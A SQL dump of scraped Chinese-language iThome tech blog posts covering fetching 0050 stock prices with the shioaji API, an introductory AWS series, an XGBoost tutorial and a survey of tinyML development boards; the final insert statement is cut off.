PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10259604','[Day2] 抓取每日收盤價','從零開始使用python打造簡易投資工具','2',replace('\n                        <div class="markdown__style">\n                                                            <p>本日目標為抓取0050的收盤價，以下分為抓取1分K資料的部分和轉換成每日收盤價的部分</p>\n<h1>抓取每日收盤價</h1>\n<p>抓到的每日收盤價之後拿來做一些指標以及做回測，使用方法參考以下兩個永豐金的shioaji官方連結<br>\n<a href="https://sinotrade.github.io/tutor/login/" target="_blank">https://sinotrade.github.io/tutor/login/</a><br>\n<a href="https://sinotrade.github.io/tutor/market_data/historical/" target="_blank">https://sinotrade.github.io/tutor/market_data/historical/</a></p>\n<p>這邊是匯入程式庫<br>\nfrom shioaji.data import Kbars<br>\nimport pandas as pd<br>\nimport shioaji</p>\n<p>這邊是登入的部分，以下是用測試帳號，如果是永豐金證券的客戶要用正式帳號登入就把simulation改False，ID改身分證字號，密碼用永豐金證券的密碼<br>\napi = shioaji.Shioaji(simulation=True)<br>\nperson_id=''PAPIUSER01''<br>\npasswd=''2222''<br>\napi.login(<br>\n&nbsp;&nbsp;&nbsp;&nbsp;person_id=person_id,<br>\n&nbsp;&nbsp;&nbsp;&nbsp;passwd=passwd,<br>\n&nbsp;&nbsp;&nbsp;&nbsp;contracts_cb=lambda security_type: print(f"{repr(security_type)} fetch done.")<br>\n)<br>\n這邊可以抓取K棒,以0050當作範例,資料輸出到df,他最後面可以輸入k棒的起始和結束日期<br>\nkbars = api.kbars(api.Contracts.Stocks["0050"], start="2010-01-01", end="2021-09-02")<br>\ndf = pd.DataFrame({kbars})<br>\ndf.ts = pd.to_datetime(df.ts)</p>\n<p>用print輸出df的內容，裡面有開高低收跟成交量，可以抓到將近3年內的1分K歷史資料，還滿佛的<br>\nprint(df)<br>\nts     Low    High   Close  Volume    Open<br>\n0      2018-12-07 09:01:00   75.60   75.60   75.60     115   75.60<br>\n1      2018-12-07 09:02:00   75.60   75.60   75.60      46   75.60<br>\n2      2018-12-07 09:03:00   75.55   75.60   75.60      53   75.60<br>\n3      2018-12-07 09:04:00   75.60   75.70   75.65     104   75.60<br>\n4      2018-12-07 09:05:00   75.70   75.75   75.75      55   75.70<br>\n...     ...     ...     ...     ...     ...<br>\n169109 2021-09-02 13:26:00  139.95  139.95  139.95       0  139.95<br>\n169110 2021-09-02 13:27:00  139.95  139.95  139.95       0  139.95<br>\n169111 2021-09-02 13:28:00  139.95  139.95  139.95       0  139.95<br>\n169112 2021-09-02 13:29:00  139.95  139.95  139.95       0  139.95<br>\n169113 2021-09-02 13:30:00  139.90  139.90  139.90     150  139.90</p>\n<p>用以下指令可以抽取其中收盤價的部分<br>\nclose=df[''Close'']<br>\nclose.index=df.ts</p>\n<h1>接下來轉換為每日收盤價</h1>\n<p>轉成每日收盤價的做法就是從一分K的第一天LOOP到最後一天，然後把每一天的收盤價都抓出來湊成一個pandas.series</p>\n<p>如果要抽取特定日期的分線資料可以用這個指令<br>\nclose[''2021-09-02'']</p>\n<p>用以下兩個指令可以抓取第一天和最後一天的日期<br>\ndate_begin=close.index[0].date()<br>\ndate_end=close.index[-1].date()<br>\ndelta = datetime.timedelta(days=1)</p>\n<p>用以下指令可以創建一個series，index是日期，數值放收盤價，先用create_PairForSeries把第一天的series做出來<br>\ndef create_PairForSeries(date,close):<br>\n&nbsp;&nbsp;&nbsp;&nbsp;val=close[str(date)][-1]<br>\n&nbsp;&nbsp;&nbsp;&nbsp;return pd.Series({date:val})<br>\ndayclose=create_PairForSeries(date_begin,close)</p>\n<p>這邊可以把後面的資料用同樣的function做成series，然後像人體蜈蚣一樣接在第一天的series後面，這邊的try except是用來處理假日沒有價格的問題用的<br>\ndate_begin += delta<br>\nwhile date_begin &lt;= date_end:<br>\n&nbsp;&nbsp;&nbsp;&nbsp;try:<br>\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;append=create_PairForSeries(date_begin,close)<br>\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dayclose=dayclose.append(append)<br>\n&nbsp;&nbsp;&nbsp;&nbsp;except:<br>\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pass<br>\n&nbsp;&nbsp;&nbsp;&nbsp;date_begin += delta</p>\n<p>print(dayclose)</p>\n<p>2021-05-21    132.35<br>\n2021-05-24    132.15<br>\n2021-05-25    134.40<br>\n2021-05-26    100.00<br>\n2021-05-27    133.30</p>\n<p>2021-08-24    134.85<br>\n2021-08-30    139.50<br>\n2021-08-31    140.35<br>\n2021-09-01    141.00<br>\n2021-09-02    139.90<br>\nLength: 68, dtype: float64<br>\n今天就到這邊為止，接下來的兩大課題是回測跟指標，明天沒意外應該會先弄個簡單的均線指標吧<br>\n題外話就是markdown排版有點難度，接下來可能還是把程式碼用圖片的方式貼上來</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'永豐金融APIs',NULL,'2021-09-02 21:27:38');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10260621','Day 1 無限手套 AWS 版：掌控一切的 5 + 1 雲端必學主題','無限手套 AWS 版：掌控一切的 5 + 1 雲端必學主題','1',replace('\n                        <div class="markdown__style">\n                                                            <p><img src="https://ithelp.ithome.com.tw/upload/images/20210902/20100951b5w0u5my93.jpg" alt="https://ithelp.ithome.com.tw/upload/images/20210902/20100951b5w0u5my93.jpg"></p>\n<blockquote>\n<h4><code>賀！獲獎鐵人賽「IT管理組/佳作」</code> + <code>新書出爐「AWS 自學聖經：5大必學雲端主題・超圖解入門」</code></h4>\n<p>感謝大家熱烈迴響，我也受出版社邀請，以此次鐵人賽系列文章為基底，加以擴充了 &gt;60% 的內容，出版此次精彩的 AWS 自學聖經。許多我們在這 30 天內沒有辦法詳細介紹的部分，老師都會在書籍中，透過全彩圖解的方式講解，讓你/妳快速且更深入的上手 AWS 雲端技術！</p>\n<p>此本書非常適合想要自學卻沒有大量預算的人，透過五大章節的安排，我將帶領你進入 AWS 雲端世界，歡迎有興趣的人，把握剛出版時的特價優惠，點擊下方書籍連結了解更多：</p>\n<p><a href="https://www.tenlong.com.tw/products/9789860776669?list_name=i-r-zh_tw" target="_blank">https://www.tenlong.com.tw/products/9789860776669?list_name=i-r-zh_tw</a></p>\n</blockquote>\n<h4>開賽前言</h4>\n<p>之前陸續錄製了受到廣泛好評的圖解教學影片，常常收到反饋說有人仍然習慣透過文章學習，主要是因為能夠快速搜尋到相關資訊。我想著，也很合理，畢竟每個人學習的習慣與模式都不同。因此，想透過這次參賽，一方面來督促自己，一方面也將 AWS 相關學習知識整理成文章，免費分享給大家！</p>\n<h4>作者介紹</h4>\n<p>大家好，我叫 Sam，「用圖片高效學程式」創辦人，我擅長將複雜的概念，轉換為簡單易懂的圖解動畫。這次也將延續此教學特色，把複雜難懂的 AWS 轉換成簡單易懂的圖文文章，幫大家快速打好 AWS 知識體系基底。</p>\n<h4>主題名稱構想</h4>\n<p>開頭這前幾天，我會來跟大家多聊聊一些軟性的 AWS 知識背景，做個暖身。</p>\n<p>相信大家最近都很熟悉「復仇者聯盟系列」，其中第三集的薩諾斯更是蒐集到了 6 個無限寶石放到無限手套上，「Click！」彈指一下毀滅地球上一半的人。這邊取用無限手套威力強大的概念，我將挑選出 AWS 中最為重要、CP 值最高的 5 + 1 大主題，一一來為大家剖析並快速上手入門。至於是哪 5 大主題？＋１又是加哪個壹？這邊就先賣個關子，歡迎對此主題有興趣的人，點擊「追蹤」就能獲得最新文章上架通知！</p>\n<p>不知道大家在學到新技術後，都怎麼運用到自己的職涯上的。假設你搜集到了這六顆 AWS 寶石，你會想要？</p>\n<ol>\n<li>從普通工程師，轉職為 DevOps 工程師</li>\n<li>入坑 SRE 的第一步</li>\n<li>為自己的 side project 設置雲端環境</li>\n<li>把世界上的慣老闆消失一半 XD</li>\n<li>其他(...)</li>\n</ol>\n<p>歡迎留言分享想法～</p>\n<h4>What''s Next?</h4>\n<p>明天，我們將開始介紹「什麼是 AWS？又為何企業這麼需要 AWS 人才？」!</p>\n<p>(<a href="https://imgur.com/r/thanosdidnothingwrong/0qIPe3d" target="_blank">封面圖片來源</a>)</p>\n<hr>\n<h4>「用圖片高效學程式」</h4>\n<p>如果妳對圖解程式教學有興趣，想學習更多其他技術，歡迎加入「用圖片高效學程式」：</p>\n<blockquote>\n<p>臉書專頁: <a href="https://www.facebook.com/105673814305452" target="_blank">https://www.facebook.com/105673814305452</a></p>\n</blockquote>\n<blockquote>\n<p>Youtube 頻道: <a href="https://www.youtube.com/channel/UCZ0PZi7oCPH_eUqBpNbBy0Q" target="_blank">https://www.youtube.com/channel/UCZ0PZi7oCPH_eUqBpNbBy0Q</a></p>\n</blockquote>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'IT管理',NULL,'2021-09-06 07:36:51');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10260622','Day 2 AWS 是什麼？又為何企業這麼需要 AWS 人才？','無限手套 AWS 版：掌控一切的 5 + 1 雲端必學主題','2',replace('\n                        <div class="markdown__style">\n                                                            <p>今天我們來聊聊學習 AWS 的動機與價值！</p>\n<h4>AWS 是什麼？</h4>\n<p>AWS 是一個雲端服務提供商，提供開發者快速擁有雲端主機、資料庫、檔案儲存空間等計算機資源。相較之下，傳統公司則需自行維護機房、自行購置硬體設備、雇用一群 IT 人員，且難以根據需求彈性增減設備，這樣的難處也讓 AWS 這樣的雲端供應商興起，成為現行企業部署軟體的第一選擇。</p>\n<h4>雲端技術的崛起</h4>\n<p>根據知名市調公司統計，光 2020 一季內，全球雲端技術產業上漲了 32% ，達到 39,900,000,000 美元，其中 AWS 更是佔據了整個雲端產業市值的三分之一，如下圖。可以說學習 AWS 就是掌握雲端技術的最好途徑。許多公司陸續汰換自己架設的老舊機房，將服務都放到雲端上面，也讓雲端人才產生空前的供不應求。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210902/2010095112TPhbBolR.png" alt="https://ithelp.ithome.com.tw/upload/images/20210902/2010095112TPhbBolR.png"></p>\n<p>其中，AWS 的成長速度更是遠遠高過於其他市場上競爭者，如下圖橘線部分。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210902/20100951BOvmDryn4I.png" alt="https://ithelp.ithome.com.tw/upload/images/20210902/20100951BOvmDryn4I.png"></p>\n<h4>雲端技術帶來的薪資成長</h4>\n<p>面對如此高速成長的雲端產業，連帶也讓擁有雲端技術的人才拿到相對更高的薪資。根據 Forbes 2018 年統計，在各類技術證照中，AWS 兩項證照名列第二與第四名，可以說擁有著極高的 CP 值。若說時間有限要先說什麼，絕對是先學 AWS 技術來為自己提升能力、並為長期職涯加薪。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210902/20100951IK8Ldynhv7.png" alt="https://ithelp.ithome.com.tw/upload/images/20210902/20100951IK8Ldynhv7.png"></p>\n<h4>What''s Next?</h4>\n<p>明天，我們將接著介紹「雲端四大平台的比較：AWS vs GCP vs Azure vs Alibaba」!</p>\n<hr>\n<blockquote>\n<p>歡迎加入「用圖片高效學程式」:<br>\n<a href="https://www.facebook.com/105673814305452" target="_blank">https://www.facebook.com/105673814305452</a></p>\n</blockquote>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'IT管理',NULL,'2021-09-07 09:39:44');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10273094','[Day 15] 機器學習常勝軍 - XGBoost','全民瘋AI系列2.0','15',replace('\n                        <div class="markdown__style">\n                                                            <h1>XGBoost</h1>\n<h2>今日學習目標</h2>\n<ul>\n<li>XGBoost 介紹\n<ul>\n<li>XGBoost 是什麼？為什麼它那麼強大？</li>\n<li>XGBoost 優點</li>\n</ul>\n</li>\n<li>比較兩種整體學習架構差異？\n<ul>\n<li>Bagging vs. Boosting</li>\n<li>Boosting vs. Decision Tree</li>\n</ul>\n</li>\n<li>Boosting 方法有哪些</li>\n<li>實作 XGBoost 分類器與迴歸器\n<ul>\n<li>比較 Bagging 與 Boosting 兩者差別</li>\n</ul>\n</li>\n</ul>\n<h2>人人驚奇的 XGBoost</h2>\n<p>XGboost 全名為 eXtreme Gradient Boosting，是目前 Kaggle 競賽中最常見到的算法，同時也是多數得獎者所使用的模型。此機器學習模型是由華盛頓大學博士生陳天奇所提出來的，它是以 Gradient Boosting 為基礎下去實作，並添加一些新的技巧。它可以說是結合 Bagging 和 Boosting 的優點。XGboost 保有 Gradient Boosting 的做法，每一棵樹是互相關聯的，目標是希望後面生成的樹能夠修正前面一棵樹犯錯的地方。此外 XGboost 是採用特徵隨機採樣的技巧，和隨機森林一樣在生成每一棵樹的時候隨機抽取特徵，因此在每棵樹的生成中並不會每一次都拿全部的特徵參與決策。此外為了讓模型過於複雜，XGboost 在目標函數添加了標準化。因為模型在訓練時為了擬合訓練資料，會產生很多高次項的函數，但反而容易被雜訊干擾導致過度擬合。因此 L1/L2 Regularization 目的是讓損失函數更佳平滑，且抗雜訊干擾能力更大。最後 XGboost 還用到了一階導數和二階導數來生成下一棵樹。其中 Gradient 就是所謂的一階導數，而 Hessian 即為二階導數。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210927/20107247W0yHGgAOFG.png" alt="https://ithelp.ithome.com.tw/upload/images/20210927/20107247W0yHGgAOFG.png"></p>\n<h2>XGBoost 優點</h2>\n<p>XGBoost 除了可以做分類也能進行迴歸連續性數值的預測，而且效果通常都不差。並透過 Boosting 技巧將許多弱決策樹集成在一起形成一個強的預測模型。</p>\n<ul>\n<li>利用了二階梯度來對節點進行劃分</li>\n<li>利用局部近似算法對分裂節點進行優化</li>\n<li>在損失函數中加入了 L1/L2 項，控制模型的複雜度</li>\n<li>提供 GPU 平行化運算</li>\n</ul>\n<h2>Bagging vs. Boosting</h2>\n<p>在這裡幫大家回顧一下整體學習中的 Bagging 與 Boosting 兩者間的差異。首先 Bagging 透過隨機抽樣的方式生成每一棵樹，最重要的是每棵樹彼此獨立並無關聯。先前所提到的隨機森林就是 Bagging 的實例。另外 Boosting 則是透過序列的方式生成樹，後面所生成的樹會與前一棵樹相關。本章所提及的 XGBoost 就是 Boosting 方法的其中一種實例。正是每棵樹的生成都改善了上一棵樹學習不好的地方，因此 Boosting 的模型通常會比 Bagging 還來的精準。</p>\n<ul>\n<li>Bagging 透過抽樣的方式生成樹，每棵樹彼此獨立</li>\n<li>Boosting 透過序列的方式生成樹，後面生成的樹會與前一棵樹相關</li>\n</ul>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210927/20107247j1llMXV7ZD.png" alt="https://ithelp.ithome.com.tw/upload/images/20210927/20107247j1llMXV7ZD.png"></p>\n<h2>Boosting vs. Decision Tree</h2>\n<p>我們再與最一開始所提的決策樹做比較。決策樹通常為一棵複雜的樹，而在 Boosting 是產生非常多棵的樹，但是每一棵的樹都很簡單的決策樹。Boosting 希望新的樹可以針對舊的樹預測不太好的部分做一些補強。最終我們要把所有簡單的樹合再一起才能當最後的預測輸出。</p>\n<h2>Boosting 方法有哪些</h2>\n<p>AdaBoost 是由 Yoav Freund 和 Robert Schapire 於 1995 年提出。所謂的自適應是表示根據弱學習的學習誤差率表現來更新訓練樣本的權重，然後基於調整權重後的訓練集來訓練第二個弱學習器，藉由此方法不斷的迭代下去。</p>\n<ul>\n<li>AdaBoost（Adaptive Boosting)\n<ul>\n<li>\n<a href="https://scikit-learn.org/stable/modules/generated/sklearn.ensemble.AdaBoostClassifier.html" target="_blank">AdaBoostClassifier</a>\n</li>\n<li>\n<a href="https://scikit-learn.org/stable/modules/generated/sklearn.ensemble.AdaBoostRegressor.html#sklearn.ensemble.AdaBoostRegressor" target="_blank">AdaBoostRegressor</a>\n</li>\n</ul>\n</li>\n</ul>\n<p>Gradient Boosting 由 Friedman 於 1999 年提出。其中 GBDT (Gradient Boosting Decision Tree) 的弱學習器僅限於只能使用 CART 決策樹模型，並採用加法模型的前向分步算法來解決分類和迴歸問題。</p>\n<ul>\n<li>Gradient Boosting\n<ul>\n<li>\n<a href="https://scikit-learn.org/stable/modules/generated/sklearn.ensemble.GradientBoostingClassifier.html" target="_blank">GradientBoostingClassifier</a>\n</li>\n<li>\n<a href="https://scikit-learn.org/stable/modules/generated/sklearn.ensemble.GradientBoostingRegressor.html#sklearn.ensemble.GradientBoostingRegressor" target="_blank">GradientBoostingRegressor</a>\n</li>\n</ul>\n</li>\n</ul>\n<p>接下來介紹三個近年三個強大的開源機器學習專案。首先 <a href="https://xgboost.readthedocs.io/en/latest/" target="_blank">XGBoost</a> 最初是由陳天奇於 2014 年 3 月發起的一個研究項目，並在短時間內成為競賽中的熱門的模型。接著於 2017 年 1 月微軟發布了第一個穩定的 <a href="https://lightgbm.readthedocs.io/en/latest/" target="_blank">LightGBM</a> 版本。它是一個基於 Gradient Boosting 的輕量級的演算法，優點在於使用少量資源、更快的訓練效率得到更好的準確度。另外在同年的 4 月，俄羅斯的一家科技公司 Yandex 發布了 <a href="https://catboost.ai/" target="_blank">CatBoost</a>，其核心依然使用了 Gradient Boosting 技巧，並為類別型的特徵做特別的轉換並產生新的數值型特徵。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210927/201072476IcBgn7t0E.png" alt="https://ithelp.ithome.com.tw/upload/images/20210927/201072476IcBgn7t0E.png"></p>\n<p>未來幾天將會介紹 LightGBM 與 CatBoost 哦！</p>\n<h2>[程式實作]</h2>\n<h2>XGBoost 分類器</h2>\n<p>Parameters:</p>\n<ul>\n<li>n_estimators: 總共迭代的次數，即決策樹的個數。預設值為100。</li>\n<li>max_depth: 樹的最大深度，默認值為6。</li>\n<li>booster: gbtree 樹模型(預設) / gbliner 線性模型</li>\n<li>learning_rate: 學習速率，預設0.3。</li>\n<li>gamma: 懲罰項係數，指定節點分裂所需的最小損失函數下降值。</li>\n</ul>\n<p>Attributes:</p>\n<ul>\n<li>feature_importances_: 查詢模型特徵的重要程度。</li>\n</ul>\n<p>Methods:</p>\n<ul>\n<li>fit: 放入X、y進行模型擬合。</li>\n<li>predict: 預測並回傳預測類別。</li>\n<li>score: 預測成功的比例。</li>\n<li>predict_proba: 預測每個類別的機率值。</li>\n</ul>\n<pre><code class="language-py">from xgboost import XGBClassifier\n\n# 建立 XGBClassifier 模型\nxgboostModel = XGBClassifier(n_estimators=100, learning_rate= 0.3)\n# 使用訓練資料訓練模型\nxgboostModel.fit(X_train, y_train)\n# 使用訓練資料預測分類\npredicted = xgboostModel.predict(X_train)\n</code></pre>\n<h3>使用Score評估模型</h3>\n<p>我們可以直接呼叫 <code>score()</code> 直接計算模型預測的準確率。</p>\n<pre><code class="language-py"># 預測成功的比例\nprint(''訓練集: '',xgboostModel.score(X_train,y_train))\nprint(''測試集: '',xgboostModel.score(X_test,y_test))\n</code></pre>\n<p>輸出結果：</p>\n<pre><code>訓練集:  1.0\n測試集:  0.9333333333333333\n</code></pre>\n<p>大家可以試著與前幾天的決策樹和隨機森林兩個模型相比較。是不是 XGBoost 有著更好的預測結果呢？因為有了 Gradient Boosting 學習機制，大幅提升了預測能力。在學習過程中將預測不好的地方，尤其是橘色 (Versicolour) 與綠色 (Virginica) 交界處有更好的評估能力。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210927/20107247DEIRbXbcJh.png" alt="https://ithelp.ithome.com.tw/upload/images/20210927/20107247DEIRbXbcJh.png"></p>\n<h2>XGBoost (迴歸器)</h2>\n<p>Parameters:</p>\n<ul>\n<li>n_estimators: 總共迭代的次數，即決策樹的個數。預設值為100。</li>\n<li>max_depth: 樹的最大深度，默認值為6。</li>\n<li>booster: gbtree 樹模型(預設) / gbliner 線性模型</li>\n<li>learning_rate: 學習速率，預設0.3。</li>\n<li>gamma: 懲罰項係數，指定節點分裂所需的最小損失函數下降值。</li>\n</ul>\n<p>Attributes:</p>\n<ul>\n<li>feature_importances_: 查詢模型特徵的重要程度。</li>\n</ul>\n<p>Methods:</p>\n<ul>\n<li>fit: 放入X、y進行模型擬合。</li>\n<li>predict: 預測並回傳預測類別。</li>\n<li>score: 預測成功的比例。</li>\n<li>predict_proba: 預測每個類別的機率值。</li>\n</ul>\n<pre><code class="language-py">import xgboost as xgb\n\n# 建立 XGBRegressor 模型\nxgbrModel=xgb.XGBRegressor()\n# 使用訓練資料訓練模型\nxgbrModel.fit(x,y)\n# 使用訓練資料預測\npredicted=xgbrModel.predict(x)\n</code></pre>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20210927/20107247zmhCwNsfV1.png" alt="https://ithelp.ithome.com.tw/upload/images/20210927/20107247zmhCwNsfV1.png"></p>\n<h2>Reference</h2>\n<ul>\n<li>\n<a href="https://medium.com/@pahome.chen/xgboost%E5%85%A5%E9%96%80%E7%B6%93%E9%A9%97%E5%88%86%E4%BA%AB-e06931b835f5" target="_blank">XGboost入門經驗分享-超參數解析</a>\n</li>\n<li>\n<a href="https://towardsdatascience.com/20-burning-xgboost-faqs-answered-to-use-the-library-like-a-pro-f8013b8df3e4" target="_blank">關於 XGBoost 20 個 FAQ</a>\n</li>\n</ul>\n<blockquote>\n<p>本系列教學內容及範例程式都可以從我的 <a href="https://github.com/andy6804tw/2021-13th-ironman" target="_blank">GitHub</a> 取得！</p>\n</blockquote>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'AI & Data',NULL,'2021-09-27 10:35:17');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10265166','[Day 03] tinyML開發板介紹','爭什麼，把AI和MCU摻在一起做tinyML就對了！','3',replace('\n                        <div class="markdown__style">\n                                                            <p>目前tinyML基金會並沒有指定特定的開發板或開發平台，也沒有限制可以跑那些項目，只期望功耗能在毫瓦(mW)等級，用電池供電即可。接下來會幫大家介紹幾塊比較常見（平價）、各平台商支援較完整的開發板，其中大部份主晶片都是使用Arm Cortex-M系列MCU，從M0+到M7都有，也有非Arm系列的，以下簡單列出數款值大家參考。</p>\n<p>ps. 由於MCU規格大小性能差異頗大，所以可以運行何種模型及速度是否滿足，須以實際佈署為準。</p>\n<ul>\n<li>Arduino Uno R3</li>\n<li>Arducam Pico4ML(Raspberry Pi RP2040)</li>\n<li>Seeeduino XAIO (SAMD21G18)</li>\n<li>Eta ECM 3532</li>\n<li>Silicon Labs Thunderboarrd Sense 2</li>\n<li>Nordic nRF52840</li>\n<li>Arduino Nano 33 BLE Sense (nRF52840)</li>\n<li>Arduino Protenta H7 (STM32H747XI)</li>\n<li>OpenMV Cam H7 (STM32H743VI)</li>\n<li>Himax WE-I Plus （台灣廠商奇景光電）</li>\n</ul>\n<p><img src="https://1.bp.blogspot.com/-lo9RGRcEGW8/YULrONzVvOI/AAAAAAAAEuA/WMx2JuDkfBQ6Fj3TSggyqeLBmUDiFjR0ACPcBGAYYCw/s1658/iThome_Day_03_Fig_01.jpg" alt="常見tinyML開發板"><br>\nFig. 3-1 常見tinyML開發板。(OmniXRI整理繪製, 2021/8/14)</p>\n<p><img src="https://1.bp.blogspot.com/-KARrP57bcg8/YULuC33kUxI/AAAAAAAAEuM/L5izu-WWXJcbTg7khZ01JMVXxAn6EQLgwCLcBGAsYHQ/s1658/iThome_Day_03_Fig_02.jpg" alt="tinyML開發板主要規格比較"><br>\nFig. 3-2 tinyML開發板主要規格比較。(OmniXRI整理繪製, 2021/8/14)</p>\n<p>在Arm Cortex-M系列中，皆為32bit MCU，依指令集效能(非工作時脈速度）來排名，大概為M0, M0+, M1, M3, M4, M7, M23, M33, M35P, M55，而其內建的程式碼區(Flash)和靜態隨機記憶體(SRAM)通常不多，僅有數百KB到數MB而已，並會隨著不同廠商及產品線會有不同配置。不過相較於一般僅有數十KB Code Flash及數KB的SRAM，這樣的配置已相當不錯，可做出相當多的應用。</p>\n<p>從上面表格中可看出，Cortex-M的MCU的工作時脈通常不高，記憶體也不多，這使得運行tinyML前就要考慮是否能將模型及參數塞進程式碼區，運行時所需的變數記憶體是否夠用，同時要評估工作時脈（含平行指令數）推論速度是否能滿足實際應用。當然這些評估工作有些亦由開發平台商提供的工具代勞，不須使用者頭痛，待後面章節再行介紹。</p>\n<p>目前在這麼多開發板中，其中又以<strong>Arduino Nano 33 BLE Sense</strong>被最多tinyML平台商支援，其主要原因如下所示：</p>\n<ul>\n<li>主晶片為Nordic nRF52840，其中以Arm Cortex-M4為主要核心，可支援浮點數運算，工作時脈64MHz, 1MB Flash, 256KB SRAM。</li>\n<li>Arm Cortex-M4可支援Arm Mbed作業系統及Cortex單晶片軟體介面標準CMSIS(Common Microcontroller Software Interface Standard)，其中亦包括CMSIS-NN神經網路加速運算函式庫。</li>\n<li>板子上有很多感測器，包括運動感測模組、麥克風（聲音）、手勢、色彩、近接（光電）、氣壓、溫濕度等。</li>\n<li>具有2.4GHz 藍牙低功耗模組(BT 5.0, BLE)可輕鬆連接到筆電或其它行動裝置，方便傳送資料及接收命令。</li>\n<li>板子體積很小，僅有45mm x 18mm，非常適合直接做成產品原型機。</li>\n</ul>\n<p><img src="https://1.bp.blogspot.com/-9pCPASiVMjQ/YUL0TGhUaSI/AAAAAAAAEuU/Rskgd8n11MUwEkO5hAHekDPPKFQkzuC2gCLcBGAsYHQ/s1658/iThome_Day_03_Fig_03.jpg" alt="Arduino Nano 33 BLE Sense規格表"><br>\nFig. 3-3 Arduino Nano 33 BLE Sense規格表。(OmniXRI整理繪製, 2021/8/14)</p>\n<p>另外Arduino Nano 33還有兩片兄弟板，分別為Nano 33 IoT, Nano 33 BLE，原則上和Nano 33 BLE Sense只差在感測器的支援數量不同，其它使用上都相同，更完整規格及使用說明可參見文末連結。</p>\n<p>最後補充幾個重要的tinyML開發平台商所支援的開發板清單。</p>\n<p><strong>Edge Impulse</strong> <a href="https://docs.edgeimpulse.com/docs/fully-supported-development-boards" target="_blank">https://docs.edgeimpulse.com/docs/fully-supported-development-boards</a></p>\n<ul>\n<li>ST B-L475E-IOT01A (IoT Discovery Kit)</li>\n<li>Arduino Nano 33 BLE Sense</li>\n<li>Eta Compute ECM3532 AI Sensor</li>\n<li>Eta Compute ECM3532 AI Vision</li>\n<li>OpenMV Cam H7 Plus</li>\n<li>Himax WE-I Plus</li>\n<li>Nordic Semiconductor nRF52840 DK</li>\n<li>Nordic Semiconductor nRF5340 DK</li>\n<li>Nordic Semiconductor nRF9160 DK</li>\n<li>Silicon Labs Thunderboard Sense 2</li>\n<li>Sony''s Spresense</li>\n<li>TI CC1352P LaunchPad</li>\n<li>Arduino Portenta H7 + Vision shield (preview support)</li>\n<li>Raspberry Pi 4</li>\n<li>NVIDIA Jetson Nano</li>\n<li>Seeed Wio Terminal (ATSAMD51)</li>\n<li>Agora Product Development Kit</li>\n<li>Arducam Pico4ML TinyML Dev Kit (PR2040)</li>\n<li>Blues Wireless Swan (STM32L4+)</li>\n</ul>\n<p><strong>AITS (cAInvas)</strong> <a href="https://www.ai-tech.systems/cainvas/" target="_blank">https://www.ai-tech.systems/cainvas/</a></p>\n<ul>\n<li>Raspberry Pi 3</li>\n<li>Arduino Nano 33 BLE Sense</li>\n<li>STM32F4</li>\n<li>STM32L4</li>\n<li>STM32F3</li>\n<li>Microchip AT91SAM9260</li>\n<li>Infineon PSoC 6</li>\n<li>NXP i.MX RT1060</li>\n<li>NXP LPC5500</li>\n</ul>\n<p><strong>SensiML</strong> <a href="https://sensiml.com/documentation/firmware/" target="_blank">https://sensiml.com/documentation/firmware/</a></p>\n<ul>\n<li>Arduino Nano 33 BLE Sense</li>\n<li>Arm GCC Cortex M4/M7/A53</li>\n<li>Microchip SAMD21 ML Eval Kit (SAM-IoT WG）</li>\n<li>Nordic Thingy</li>\n<li>QuickLogic Chilkat</li>\n<li>QuickLogic QuickAI</li>\n<li>QuickLogic QuickFeather</li>\n<li>Raspberry Pi</li>\n<li>Sillicon Labs Thunderboard Sense 2</li>\n<li>SparkFun QuickLogic Thing Plus - EOS S3</li>\n<li>ST SensorTile</li>\n<li>ST SensorTile.Box</li>\n<li>x86 Processors</li>\n</ul>\n<p><strong>Google TensorFlow Lite Microcontroller</strong> <a href="https://www.tensorflow.org/lite/microcontrollers" target="_blank">https://www.tensorflow.org/lite/microcontrollers</a></p>\n<ul>\n<li>Arduino Nano 33 BLE Sense</li>\n<li>SparkFun Edge</li>\n<li>STM32F746 Discovery</li>\n<li>Adafruit EdgeBadge</li>\n<li>Adafruit TensorFlow Lite for Microcontrollers</li>\n<li>Adafruit Circuit Playground Bluefruit</li>\n<li>Espressif ESP32-DevKitC</li>\n<li>Espressif ESP-EYE</li>\n<li>Wio Terminal：ATSAMD51</li>\n<li>Himax WE-I Plus EVB</li>\n<li>Synopsys DesignWare ARC EM Software Development Platform</li>\n</ul>\n<p>參考連結：</p>\n<ul>\n<li>Arm Cortex-M 維基百科 <a href="https://zh.wikipedia.org/wiki/ARM_Cortex-M" target="_blank">https://zh.wikipedia.org/wiki/ARM_Cortex-M</a>\n</li>\n<li>Arduino Nano 33 IoT <a href="https://store-usa.arduino.cc/collections/boards/products/arduino-nano-33-iot" target="_blank">https://store-usa.arduino.cc/collections/boards/products/arduino-nano-33-iot</a>\n</li>\n<li>Arduino Nano 33 BLE <a href="https://store-usa.arduino.cc/collections/boards/products/arduino-nano-33-ble" target="_blank">https://store-usa.arduino.cc/collections/boards/products/arduino-nano-33-ble</a>\n</li>\n<li>Arduino Nano 33 BLE Sense <a href="https://store-usa.arduino.cc/collections/boards/products/arduino-nano-33-ble-sense" target="_blank">https://store-usa.arduino.cc/collections/boards/products/arduino-nano-33-ble-sense</a>\n</li>\n</ul>\n <br>\n                                                    </div>\n                    